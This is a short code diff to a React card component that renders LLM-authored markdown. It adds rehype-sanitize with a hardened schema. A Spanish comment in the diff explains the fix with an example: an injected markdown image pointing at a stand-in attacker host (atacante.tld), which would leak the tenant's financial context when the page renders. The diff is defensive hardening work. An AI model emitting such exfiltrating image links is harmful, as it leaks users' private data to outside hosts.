@@ -9,6 +9,8 @@
 import { useState, useCallback } from 'react';
 import { Sparkles, FileText, ExternalLink } from 'lucide-react';
 import ReactMarkdown from 'react-markdown';
+import rehypeSanitize from 'rehype-sanitize';
+import { MARKDOWN_SANITIZE_SCHEMA } from '@/lib/security/markdown-sanitize-schema';
 import { motion, useReducedMotion } from 'motion/react';
 import { GlassModal } from '@/components/ui/GlassModal';
 import { NormaCitation } from '@/components/workspace/cards/SurvivalCard';
@@ -200,7 +202,13 @@ export function SintetizadorCard({ data, loading, t, language = 'es' }: Sintetiz
            * n-1000 es la tinta primaria y ya se adapta sola: 19.11:1 / 16.07:1.
            */
           <div className="prose prose-sm dark:prose-invert max-w-none prose-headings:font-serif-elite prose-headings:tracking-tight prose-a:text-area-escudo prose-strong:text-n-1000 pb-4">
-            <ReactMarkdown>{data.markdown}</ReactMarkdown>
+            {/* Seguridad: el markdown lo autora el LLM. Sin schema endurecido, un
+                `![](https://atacante.tld/?d=…)` inyectado se pide solo al pintarse
+                y filtra el contexto financiero del tenant. Ver
+                src/lib/security/markdown-sanitize-schema.ts */}
+            <ReactMarkdown rehypePlugins={[[rehypeSanitize, MARKDOWN_SANITIZE_SCHEMA]]}>
+              {data.markdown}
+            </ReactMarkdown>
           </div>
         )}
       </GlassModal>
